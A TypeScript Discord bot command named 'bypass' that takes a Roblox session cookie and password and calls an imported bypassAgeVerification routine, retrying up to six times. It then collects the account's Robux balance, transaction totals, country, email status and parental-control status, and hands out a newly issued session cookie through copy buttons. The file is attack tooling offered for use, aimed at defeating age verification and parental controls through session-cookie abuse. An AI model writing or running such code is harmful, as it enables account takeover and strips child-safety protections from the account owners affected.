import {
  SlashCommandBuilder,
  PermissionFlagsBits,
  type ChatInputCommandInteraction,
  type MessageComponentInteraction,
  MessageFlags,
} from 'discord.js';
import * as Roblox from '../../lib/roblox-api';
import { buildSuccessEmbed, buildErrorEmbed, buildInvalidCookieEmbed, buildIpLimitEmbed, buildProgressEmbed, buildAccountEmbed } from '../../lib/embed-helpers';
import { buildCopyButtons, handleCopyButtonClick } from '../../lib/button-helpers';
import { logger } from '../../lib/logger';
import type { Command } from './types';

const data = new SlashCommandBuilder()
  .setName('bypass')
  .setDescription('Attempt Gmail Bypassing (With API)')
  .addStringOption((opt) =>
    opt.setName('cookie').setDescription('Insert The Cookies!').setRequired(true)
  )
  .addStringOption((opt) =>
    opt.setName('password')
      .setDescription('Your Roblox password (we do NOT log or store this)')
      .setRequired(true)
  ) as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  try {
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    const rawCookie = interaction.options.getString('cookie', true);
    const password = interaction.options.getString('password', true);

    const validation = await Roblox.validateCookie(rawCookie);
    if (!validation.valid) {
      const embed = validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed();
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const progressEmbed = buildProgressEmbed('Sending bypass request...');
    await interaction.editReply({ embeds: [progressEmbed] });

    let result = null;
    let attempts = 0;
    let timedOut = false;

    while (!result && attempts < 6) {
      attempts++;
      const res = await Roblox.bypassAgeVerification(rawCookie, password);
      if (res.success) {
        result = res;
        break;
      }
      if (res.inProgress) {
        const updateEmbed = buildProgressEmbed(`Processing... (attempt ${attempts}/6)`);
        await interaction.editReply({ embeds: [updateEmbed] });
        await new Promise(resolve => setTimeout(resolve, 3000));
        continue;
      }
      result = res;
      break;
    }

    if (!result) {
      const embed = buildProgressEmbed('Bypass timed out. Please try again later.');
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    if (result.success) {
      const userId = validation.userId;
      const age = await Roblox.getUserAge(userId);
      const robux = await Roblox.fetchRobux(rawCookie, String(userId));
      const summary = await Roblox.fetchTransactionTotals(rawCookie, String(userId));
      const country = await Roblox.fetchCountry(rawCookie);
      const parental = await Roblox.fetchParentalControls(rawCookie);
      const thumb = await Roblox.fetchAvatarThumbnail(String(userId));

      let newCookie = result.newCookie;
      let finalUserId = userId;
      let finalUsername = validation.username;
      let finalDisplayName = validation.displayName || null;
      let finalAge = age;
      let finalRobux = robux;
      let finalSummary = summary;
      let finalCountry = country;
      let finalEmail = await Roblox.fetchEmailInfo(rawCookie);
      let finalParental = parental;
      let finalThumb = thumb;

      if (newCookie) {
        const newValidation = await Roblox.validateCookie(newCookie);
        if (newValidation.valid) {
          finalUserId = newValidation.userId;
          finalUsername = newValidation.username;
          finalDisplayName = newValidation.displayName || null;
          finalAge = await Roblox.getUserAge(finalUserId);
          finalRobux = await Roblox.fetchRobux(newCookie, String(finalUserId));
          finalSummary = await Roblox.fetchTransactionTotals(newCookie, String(finalUserId));
          finalCountry = await Roblox.fetchCountry(newCookie);
          finalEmail = await Roblox.fetchEmailInfo(newCookie);
          finalParental = await Roblox.fetchParentalControls(newCookie);
          finalThumb = await Roblox.fetchAvatarThumbnail(String(finalUserId));
        } else {
          newCookie = undefined;
        }
      }

      const embed = buildAccountEmbed(
        finalUsername,
        finalDisplayName,
        finalUserId,
        finalAge,
        finalRobux,
        finalSummary,
        finalCountry,
        finalEmail.verified ? `✅ Verified: \`${finalEmail.verified}\`` : 'No email found',
        finalParental.hasParent ? '✅ Parent linked' : '❌ No parent linked',
        finalThumb
      );

      const id = newCookie ? Math.random().toString(36).slice(2, 10) : '';
      const row = newCookie ? buildCopyButtons(id, 'bypass', newCookie, false) : undefined;
      await interaction.editReply({ embeds: [embed], components: row ? [row] : [] });
    } else {
      const embed = buildErrorEmbed(`✧ **Bypass Failed**\n────\n⭑ ${result.message}`);
      await interaction.editReply({ embeds: [embed] });
    }
  } catch (err: any) {
    logger.error({ err }, 'Bypass command error');
    await interaction.editReply({
      embeds: [buildErrorEmbed('✧ **Unexpected Error**\n────\n⭑ Something went wrong.')],
    });
  }
}

async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
  if (await handleCopyButtonClick(interaction)) return;
}

export const bypassCommand: Command = { data, execute, handleButton };